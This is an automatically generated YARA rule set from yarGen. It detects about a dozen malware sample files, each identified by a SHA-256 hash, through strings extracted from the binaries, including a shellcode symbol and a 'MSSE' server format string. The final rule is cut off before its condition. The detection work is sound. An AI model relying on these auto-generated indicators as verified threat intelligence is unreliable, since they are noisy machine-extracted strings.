/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2023-07-19
   Identifier: mw
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_0410a2daba8159f87bce47ee0ee806bae2f7e4d020e1ec9a5755fb3e302fdbf3 {
   meta:
      description = "mw - file 0410a2daba8159f87bce47ee0ee806bae2f7e4d020e1ec9a5755fb3e302fdbf3"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0410a2daba8159f87bce47ee0ee806bae2f7e4d020e1ec9a5755fb3e302fdbf3"
   strings:
      $s1 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
      $s2 = "UGv.ddI oi@2r~[<ysR]" fullword ascii /* score: '7.00'*/
      $s3 = ">L+;>_+ >@" fullword ascii /* score: '5.00'*/
      $s4 = "# JmDcJ" fullword ascii /* score: '5.00'*/
      $s5 = "\\.ddI&" fullword ascii /* score: '5.00'*/
      $s6 = "HnIy_kq" fullword ascii /* score: '4.00'*/
      $s7 = "Jygm}{_" fullword ascii /* score: '4.00'*/
      $s8 = "JyHtay_e" fullword ascii /* score: '4.00'*/
      $s9 = "EnInJy+" fullword ascii /* score: '4.00'*/
      $s10 = "HPKy_mu" fullword ascii /* score: '4.00'*/
      $s11 = "HKBy_cE" fullword ascii /* score: '4.00'*/
      $s12 = "xn5zJyi+>y" fullword ascii /* score: '4.00'*/
      $s13 = "mncDJy+" fullword ascii /* score: '4.00'*/
      $s14 = "Hway_kq" fullword ascii /* score: '4.00'*/
      $s15 = "HCjy_kq" fullword ascii /* score: '4.00'*/
      $s16 = "HVry_kq" fullword ascii /* score: '4.00'*/
      $s17 = "jHxwy_cE" fullword ascii /* score: '4.00'*/
      $s18 = "cFnu\"Jy+" fullword ascii /* score: '4.00'*/
      $s19 = "HFQy_kq" fullword ascii /* score: '4.00'*/
      $s20 = "HAKy_kq" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_19f1ac569f0eeaf463b668616806a92ad876824d8d786eb703d26390f25e6ba8 {
   meta:
      description = "mw - file 19f1ac569f0eeaf463b668616806a92ad876824d8d786eb703d26390f25e6ba8"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "19f1ac569f0eeaf463b668616806a92ad876824d8d786eb703d26390f25e6ba8"
   strings:
      $s1 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
      $s2 = "CiKgtB9" fullword ascii /* score: '5.00'*/
      $s3 = "biKgtV9" fullword ascii /* score: '5.00'*/
      $s4 = "HazPIazkIaz;Iaz" fullword ascii /* score: '4.00'*/
      $s5 = "MajhQb/" fullword ascii /* score: '4.00'*/
      $s6 = "IazTJaz" fullword ascii /* score: '4.00'*/
      $s7 = "qjhQ0:1" fullword ascii /* score: '4.00'*/
      $s8 = "Kaz(KazeKaz(Kaz" fullword ascii /* score: '4.00'*/
      $s9 = "JazFKaz" fullword ascii /* score: '4.00'*/
      $s10 = "WFlQVBb" fullword ascii /* score: '4.00'*/
      $s11 = "7bXWRfap8r[" fullword ascii /* score: '4.00'*/
      $s12 = "ajhCXuT" fullword ascii /* score: '4.00'*/
      $s13 = "bzhXX/W" fullword ascii /* score: '4.00'*/
      $s14 = "qSft@iK" fullword ascii /* score: '4.00'*/
      $s15 = ",cswjK_'*i" fullword ascii /* score: '4.00'*/
      $s16 = "icSkhIR" fullword ascii /* score: '4.00'*/
      $s17 = "aj[^%d^" fullword ascii /* score: '4.00'*/
      $s18 = "FLFiKgt" fullword ascii /* score: '4.00'*/
      $s19 = "3.czT.4" fullword ascii /* score: '4.00'*/
      $s20 = "ajhX1:1" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_25d0bc682d25a43d97a7e010deeb8dfdad80ff9562084333cd6fb99ce8907422 {
   meta:
      description = "mw - file 25d0bc682d25a43d97a7e010deeb8dfdad80ff9562084333cd6fb99ce8907422"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "25d0bc682d25a43d97a7e010deeb8dfdad80ff9562084333cd6fb99ce8907422"
   strings:
      $s1 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
      $s2 = "mnbvceumqxxd" fullword ascii /* score: '8.00'*/
      $s3 = "ZYoBflw9" fullword ascii /* score: '5.00'*/
      $s4 = "MgFs?'" fullword ascii /* score: '4.00'*/
      $s5 = "rfnw?FD" fullword ascii /* score: '4.00'*/
      $s6 = "rfMs?W" fullword ascii /* score: '4.00'*/
      $s7 = "Mfiw?^DwMFDW1/(" fullword ascii /* score: '4.00'*/
      $s8 = "rfYw1vD" fullword ascii /* score: '4.00'*/
      $s9 = "rfDw9G@s?Wp" fullword ascii /* score: '4.00'*/
      $s10 = "rfMs9^Do" fullword ascii /* score: '4.00'*/
      $s11 = "tgCw9Up" fullword ascii /* score: '4.00'*/
      $s12 = "`w?^DWZdL?" fullword ascii /* score: '4.00'*/
      $s13 = "tVXjrfkw9_" fullword ascii /* score: '4.00'*/
      $s14 = "rgNw9~DO?Qpw9ND_" fullword ascii /* score: '4.00'*/
      $s15 = "rfpw?_" fullword ascii /* score: '4.00'*/
      $s16 = "+[[UBVR[IAIITL@G_o" fullword ascii /* score: '4.00'*/
      $s17 = "`w;g`wuWh?2" fullword ascii /* score: '4.00'*/
      $s18 = "`w?^DOZHf?" fullword ascii /* score: '4.00'*/
      $s19 = ":VDrYB!" fullword ascii /* score: '4.00'*/
      $s20 = "Mfrw;UH" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      8 of them
}

rule sig_33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365 {
   meta:
      description = "mw - file 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
   strings:
      $x1 = "library\\std\\src\\sys\\windows\\args.rscmd.exe /d /c \"Windows file names may not contain `\"` or end with `\\`:" fullword ascii /* score: '31.00'*/
      $s2 = "UnsupportedCustomerrorUncategorizedOtherOutOfMemoryUnexpectedEofInterruptedArgumentListTooLongInvalidFilenameTooManyLinksCrosses" ascii /* score: '30.00'*/
      $s3 = "uncategorized errorother errorout of memoryunexpected end of fileunsupportedoperation interruptedargument list too longinvalid f" ascii /* score: '27.00'*/
      $s4 = "_ZN3std3sys7windows7process7Command5spawn17h87a66bc5d159c61cE" fullword ascii /* score: '26.00'*/
      $s5 = "_ZN3std3sys7windows7process7Command5spawn19CREATE_PROCESS_LOCK17he7e71eb310a47c2cE" fullword ascii /* score: '26.00'*/
      $s6 = "_ZN4core3ptr178drop_in_place$LT$core..result..Result$LT$std..sync..mutex..MutexGuard$LT$$LP$$RP$$GT$$C$std..sync..poison..Poison" ascii /* score: '25.00'*/
      $s7 = "_ZN3std4sync7remutex25current_thread_unique_ptr1X7__getit5__KEY17h0e7e71dd17052451E" fullword ascii /* score: '23.00'*/
      $s8 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\addr2line-0.19.0\\src\\function.rs" fullword ascii /* score: '23.00'*/
      $s9 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\addr2line-0.19.0\\src\\lib.rs" fullword ascii /* score: '23.00'*/
      $s10 = "_ZN3std4sync7remutex25current_thread_unique_ptr1X7__getit17h42c7041f37aebd65E" fullword ascii /* score: '23.00'*/
      $s11 = "_ZN7windows4core8bindings14GetProcessHeap17h0db82c85d390e1beE" fullword ascii /* score: '23.00'*/
      $s12 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\gimli-0.27.2\\src\\read\\line.rs" fullword ascii /* score: '23.00'*/
      $s13 = ".llvm.C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\rustc-demangle-0.1.21\\src\\lib.rsN" fullword ascii /* score: '23.00'*/
      $s14 = "_head_C__Users_Peter_Code_winapi_rs_x86_64_lib_libwinapi_kernel32_a" fullword ascii /* score: '22.00'*/
      $s15 = "_ZN4core3ptr59drop_in_place$LT$std..sys..windows..process..StdioPipes$GT$17h82c82917fba036abE" fullword ascii /* score: '22.00'*/
      $s16 = "_ZN4core3ptr178drop_in_place$LT$core..result..Result$LT$std..sync..mutex..MutexGuard$LT$$LP$$RP$$GT$$C$std..sync..poison..Poison" ascii /* score: '22.00'*/
      $s17 = "exeNUL\\cmd.exefallback RNG broken: " fullword ascii /* score: '22.00'*/
      $s18 = "_ZN4core3ptr237drop_in_place$LT$alloc..boxed..Box$LT$std..sys..common..thread_local..os_local..os..Value$LT$core..cell..Cell$LT$" ascii /* score: '21.00'*/
      $s19 = "_ZN4core3ptr212drop_in_place$LT$std..sys..common..thread_local..os_local..os..Value$LT$core..cell..Cell$LT$core..option..Option$" ascii /* score: '21.00'*/
      $s20 = "assertion failed: state_and_queue.addr() & STATE_MASK == RUNNINGOnce instance has previously been poisoned" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule sig_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e {
   meta:
      description = "mw - file 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
   strings:
      $x1 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '67.00'*/
      $x2 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '54.00'*/
      $x3 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '53.50'*/
      $x4 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x5 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '47.00'*/
      $x6 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '46.00'*/
      $x7 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock,  nBSSRoot" ascii /* score: '46.00'*/
      $x8 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x9 = "152587890625762939453125Bidi_ControlGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_ControlLoadLibr" ascii /* score: '44.00'*/
      $x10 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCommandLineToArgvWCreateFileMappingWCu" ascii /* score: '42.00'*/
      $x11 = "structure needs cleaning bytes failed with errno= to unused region of span with too many arguments 2910383045673370361328125AUS " ascii /* score: '35.00'*/
      $x12 = "rrentProcessIdGetSystemDirectoryWGetTokenInformationHaiti Standard TimeIDS_Binary_OperatorIndia Standard TimeKhitan_Small_Script" ascii /* score: '34.00'*/
      $x13 = "rmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexgp.waiting != nillocked m0 woke upmark - bad statu" ascii /* score: '33.00'*/
      $x14 = "collectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation " ascii /* score: '33.00'*/
      $x15 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '33.00'*/
      $x16 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitCreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed t" ascii /* score: '32.00'*/
      $x17 = "pi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii /* score: '32.00'*/
      $x18 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOther_MathPhoenicianSYSTEMRO" ascii /* score: '31.00'*/
      $s19 = "Mention name of executable when reporting error and append executable name to logs (as in \"log_path.exe_name.pid\")." fullword ascii /* score: '30.00'*/
      $s20 = ": p scheddetailsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll" fullword ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      1 of ($x*) and all of them
}

rule sig_5a268b88ea8b1cad2a07b43e855af3ad4f5e9fb0e1aef21ab4d2a66306c3dca4 {
   meta:
      description = "mw - file 5a268b88ea8b1cad2a07b43e855af3ad4f5e9fb0e1aef21ab4d2a66306c3dca4"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "5a268b88ea8b1cad2a07b43e855af3ad4f5e9fb0e1aef21ab4d2a66306c3dca4"
   strings:
      $s1 = "failed to to lock creation mutex" fullword ascii /* score: '20.00'*/
      $s2 = "failed to to lock cleanup mutex" fullword ascii /* score: '20.00'*/
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s4 = "failed to get string from atom" fullword ascii /* score: '14.00'*/
      $s5 = "8f4aef21fa2ffbe0260133994600e295582c35507d84300d4105554667044cb5bd8e28442f0fff3af74f6622225745620c8f23d43454623a7c7351f46af0b544" ascii /* score: '11.00'*/
      $s6 = "667b06e800570a07801e44357c0c58864404e324854eeb0444b5069c35d04c70003b496fbe8066262633660b9e7338dbdf2870bc6dcb47fb300d421245c33801" ascii /* score: '11.00'*/
      $s7 = "23011801cd1851b9491540198189ec791981a19ae882d8f2f6c44a59a3d1eb37e099a52540d9730464422fbce6a645f0938090650329454436e41704c8cc784d" ascii /* score: '11.00'*/
      $s8 = "89015b8052f541847e87841f4c3d484555177bd344108444f5d5108e689f4d9f056626462366fd832e12027783fd2ee725aedf4104e0b804532c182b9c1b1b78" ascii /* score: '11.00'*/
      $s9 = "f760023011801cd1851b9491540198189ec791981a19ae882d8f2f6c44a59a3d1eb37e099a52540d9730464422fbce6a645f0938090650329454436e41704c8c" ascii /* score: '11.00'*/
      $s10 = "2366fd832e12027783fd2ee725aedf4104e0b804532c182b9c1b1b78881890418902e415d1a2a91d2faa980c035670a3df07c0c540459583ef4e441f06fb5f0a" ascii /* score: '11.00'*/
      $s11 = "954e3e7cf461a9bdea70b44efb88c593040508a0db10500d1141b8181fa6c9d65d1fb20930f5504c5ed1f62204ff4e71ffba5ab8326ce2aa2dc05b0908d89a01" ascii /* score: '11.00'*/
      $s12 = "955a4058454456254445fbcf76e373427051a5161070755458b03002b20c21b2001bd188c9a19ae97610111129b5911affff8c7a229f52f50d30429dfdc37ea2" ascii /* score: '11.00'*/
      $s13 = "failed to add string to atom table" fullword ascii /* score: '9.00'*/
      $s14 = "c784d5448664fc582453db3485048a2a07f884e7463347526302deb8b3e335c606ac5650880bd049804c800330168881288288f8111bb0e18b75af108637881b" ascii /* score: '8.00'*/
      $s15 = "4f3c3705c8c546c3f00071c5e2ac4b6666362377bf734e901dd20d5885d2be4724cb0f809c05e2330280dc10080b360589c48a2f01911ab016894807dfd0152b" ascii /* score: '8.00'*/
      $s16 = "b21212604461c0548b11f990180a301f9125a91b1109bd2ead14e59820e66e96e2f86654815e8074a0685f9b1180f8024883e280d85320268785da7444045f44" ascii /* score: '8.00'*/
      $s17 = "f926048f3e5310b651c059f4b45047461c1a8b298eab59958f08050089015b8052f541847e87841f4c3d484555177bd344108444f5d5108e689f4d9f05662646" ascii /* score: '8.00'*/
      $s18 = "a125140ea3999e740f001bf21a96203e90b501f99a09105986318838e06444248d0c4e4cf0008545f058c35e44f45885c4d9004c27bab3277766263522c4fb1a" ascii /* score: '8.00'*/
      $s19 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '7.00'*/
      $s20 = "      <!--The ID below indicates application support for Windows 10 -->" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule aaa46c91130cfbd5b439074e19d9afda0b678e9682c3ddb5ce2d05fcbb562855 {
   meta:
      description = "mw - file aaa46c91130cfbd5b439074e19d9afda0b678e9682c3ddb5ce2d05fcbb562855"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "aaa46c91130cfbd5b439074e19d9afda0b678e9682c3ddb5ce2d05fcbb562855"
   strings:
      $s1 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
      $s2 = "+SDP<^IJimz,!UB\\@" fullword ascii /* score: '4.00'*/
      $s3 = "ImJnr&w_" fullword ascii /* score: '4.00'*/
      $s4 = "sTkz:NnP" fullword ascii /* score: '4.00'*/
      $s5 = "5dyCB>rNK0oYP\"dTY,Uwf" fullword ascii /* score: '4.00'*/
      $s6 = "muHdc~EmIOfRGDk[UY|@[RqI" fullword ascii /* score: '4.00'*/
      $s7 = "UmJNr&/_" fullword ascii /* score: '4.00'*/
      $s8 = "wlny*5YND%" fullword ascii /* score: '4.00'*/
      $s9 = "aoJFzc{)" fullword ascii /* score: '4.00'*/
      $s10 = "libgcj-12.dll" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s11 = "\\)!oJ2r" fullword ascii /* score: '2.00'*/
      $s12 = "\\)!oJ26" fullword ascii /* score: '2.00'*/
      $s13 = ")r\"#[tv" fullword ascii /* score: '1.00'*/
      $s14 = "V&yCB>" fullword ascii /* score: '1.00'*/
      $s15 = "{\\%SFZ\\" fullword ascii /* score: '1.00'*/
      $s16 = "L;F'za9" fullword ascii /* score: '1.00'*/
      $s17 = "R&|R:j" fullword ascii /* score: '1.00'*/
      $s18 = "V%Uej~" fullword ascii /* score: '1.00'*/
      $s19 = "oJ\"|[;)" fullword ascii /* score: '1.00'*/
      $s20 = "EmJ*r&" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795 {
   meta:
      description = "mw - file eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $x1 = "28421709430404007434844970703125CertAddCertificateContextToStoreCertVerifyCertificateChainPolicyCounterClockwiseContourIntegral;" ascii /* score: '76.50'*/
      $x2 = "152587890625762939453125Bidi_ControlCIDR addressCONTINUATIONCfgMgr32.dllCircleMinus;CircleTimes;CoCreateGuidContent TypeContent-" ascii /* score: '73.00'*/
      $x3 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125C%4.3f,%4.3f,%4.3f,%4.3f,%4.3f,%4.3fGo pointer stored in" ascii /* score: '70.50'*/
      $x4 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeBad chunk length: %dCapitalDifferentialDCertFind" ascii /* score: '67.00'*/
      $x5 = "entersyscalleqslantless;expectation;exponentialefeMorphologyfePointLightfeTurbulencefemorphologyfepointlightfeturbulencegcBitsAr" ascii /* score: '63.00'*/
      $x6 = "non-IPv4 addressnon-IPv6 addressntrianglelefteq;ntrianglerighteqobject is remoteopencensus-go/%spatternTransformpatterntransform" ascii /* score: '59.00'*/
      $x7 = " lockedg= lockedm= m->curg= marked   ms cpu,  not in [ runtime= s.limit= s.state= threads= unmarked wbuf1.n= wbuf2.n=%s %q: %s(u" ascii /* score: '58.50'*/
      $x8 = "cqPepaqBXlqBVlzVddddbB3ILy///3XCA3Xez20xd5g/33jJ8RrXqMVhddddrZXC+m/5ddddddddddddfdhdddJmxVJdwdNTBGVecS3WqjWPH1ezHM9NHMiwBjTWGMKy" ascii /* score: '57.00'*/
      $x9 = "addspecial on invalid pointerbad spectral selection boundsbufio.Scanner: token too longccitt: unsupported sub-formatexecuting on" ascii /* score: '57.00'*/
      $x10 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnablestrict-trans" ascii /* score: '56.50'*/
      $x11 = "value=aacute;abl1943abortedabreve;accountaddressagrave;akuapemalalc97alefsymalt -> andand;angmsd;angrtvbangsph;angzarrany -> apa" ascii /* score: '54.50'*/
      $x12 = "triangleq;unixpacketunknown pcupload.svgupuparrowsuser-agentuser32.dllvarepsilonvarnothingvarpropto;viewTargetviewZoomInviewtarg" ascii /* score: '53.00'*/
      $x13 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '52.00'*/
      $x14 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticHTTP_PROXYHumpEqual;ISO 8859-1ISO 8859-2ISO 8859-3ISO 8859-4ISO 8859-5ISO 8859-6ISO 8859" ascii /* score: '51.00'*/
      $x15 = "x509: cannot verify signature: algorithm unimplemented is currently not supported for use in system callbacksSOFTWARE\\Microsoft" ascii /* score: '49.50'*/
      $x16 = "streamSafe was not resetstructure needs cleaningtext/html; charset=utf-8utf8_general_mysql500_cizlib: invalid dictionary bytes f" ascii /* score: '49.00'*/
      $x17 = ".WithDeadline(1907348632812595367431640625<not Stringer>APIUnavailableApplyFunction;CertCloseStoreCoInitializeExCoUninitializeCo" ascii /* score: '49.00'*/
      $x18 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCM_MapCrToWin32ErrCaucasian_AlbanianCertGetNameStringWCl" ascii /* score: '49.00'*/
      $x19 = ", i = , not , val 0.23.0390625<-chanAElig;AacuteAcirc;AgraveAlpha;Amacr;AnswerAogon;ArabicAring;AssignAtildeAugustBarwedBrahmiBr" ascii /* score: '48.00'*/
      $x20 = "file descriptor in bad statefindrunnable: netpoll with pformat did not match 1 valuefound pointer to free objectfreetype/rasterx" ascii /* score: '47.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      1 of ($x*)
}

rule fcb4d3bcaefcdffd70a72c9680090f72bb70a90d61c67e2a76b1f8a54818c70a {
   meta:
      description = "mw - file fcb4d3bcaefcdffd70a72c9680090f72bb70a90d61c67e2a76b1f8a54818c70a"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "fcb4d3bcaefcdffd70a72c9680090f72bb70a90d61c67e2a76b1f8a54818c70a"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                             ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s3 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s5 = "GCC: (GNU) 9.2-win32 20191008" fullword ascii /* score: '1.00'*/
      $s6 = "GCC: (GNU) 9.3-win32 20200320" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule sig_8b70ca880f25f4e03bcac422fb2e6044369bf25d45d9b846db546728d66618a6 {
   meta:
      description = "mw - file 8b70ca880f25f4e03bcac422fb2e6044369bf25d45d9b846db546728d66618a6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "8b70ca880f25f4e03bcac422fb2e6044369bf25d45d9b846db546728d66618a6"
   strings:
      $s1 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s2 = "F5dLLH>@" fullword ascii /* score: '6.00'*/
      $s3 = "lv}A -" fullword ascii /* score: '5.00'*/
      $s4 = "1ZArjjS#&" fullword ascii /* score: '4.00'*/
      $s5 = "QJcPS'8?" fullword ascii /* score: '4.00'*/
      $s6 = "MLrqY+5" fullword ascii /* score: '4.00'*/
      $s7 = ":MZuYHcB<H" fullword ascii /* score: '4.00'*/
      $s8 = "JLRVmYt" fullword ascii /* score: '4.00'*/
      $s9 = "=#lFXCP!Y?H" fullword ascii /* score: '4.00'*/
      $s10 = "-zSJk?" fullword ascii /* score: '4.00'*/
      $s11 = "PzLOBIO" fullword ascii /* score: '4.00'*/
      $s12 = "zmfnTAXF" fullword ascii /* score: '4.00'*/
      $s13 = "hMioR\"\\#" fullword ascii /* score: '4.00'*/
      $s14 = "kdEU8Zx" fullword ascii /* score: '4.00'*/
      $s15 = "XGGGm%-" fullword ascii /* score: '4.00'*/
      $s16 = "sNuysxT{" fullword ascii /* score: '4.00'*/
      $s17 = "mEGLS/+" fullword ascii /* score: '4.00'*/
      $s18 = "BbMd)pP" fullword ascii /* score: '4.00'*/
      $s19 = "dxBXl/k" fullword ascii /* score: '4.00'*/
      $s20 = "k}w9!%D9" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad {
   meta:
      description = "mw - file 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "vkCmdExecuteCommands" fullword ascii /* score: '26.00'*/
      $s2 = ".refptr._cgoexp_2fc953c38547_vkCmdExecuteCommands" fullword ascii /* score: '26.00'*/
      $s3 = ".rdata$.refptr._cgoexp_2fc953c38547_vkCmdExecuteCommands" fullword ascii /* score: '26.00'*/
      $s4 = "_cgoexp_2fc953c38547_vkCmdExecuteCommands" fullword ascii /* score: '26.00'*/
      $s5 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s6 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s7 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s8 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s9 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s10 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s11 = "main.shellcode" fullword ascii /* score: '21.00'*/
      $s12 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s13 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s14 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s15 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s16 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s17 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s18 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s19 = "runtime._GetProcessAffinityMask" fullword ascii /* score: '20.00'*/
      $s20 = "vulkan-1.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule sig_0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b {
   meta:
      description = "mw - file 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
   strings:
      $x1 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x2 = " to unallocated spanArabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAccep" ascii /* score: '50.00'*/
      $x3 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii /* score: '46.00'*/
